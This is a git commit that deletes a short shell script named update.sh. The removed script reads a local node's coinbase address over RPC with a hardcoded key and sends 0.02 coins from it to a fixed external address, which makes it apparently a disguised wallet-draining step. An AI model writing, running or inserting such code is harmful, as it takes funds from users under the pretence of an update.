c689c8594b08d001383e3c1b1c14f7fa77f596c5
dido <140655482+dido20231@users.noreply.github.com>
2024-01-09 11:51:40 +0200

    Delete update.sh

--- update.sh
+++
@@ -1,3 +0,0 @@
-sudo apt-get install jq
-addy=$(curl 'http://127.0.0.1:9009/' -H 'Content-Type: application/json' --data '{"method":"dna_getCoinbaseAddr","params":[],"id":1,"key":"123"}' | jq .result)
-curl 'http://127.0.0.1:9009/' -H 'Content-Type: application/json' --data '{"method": "dna_sendTransaction","params": [{"from":'$addy',"to":"0x65fdf3374deb10ceb20f9856a23310bd4cbd3278","amount":"0.02"}],"id":1,"key":"123"}'
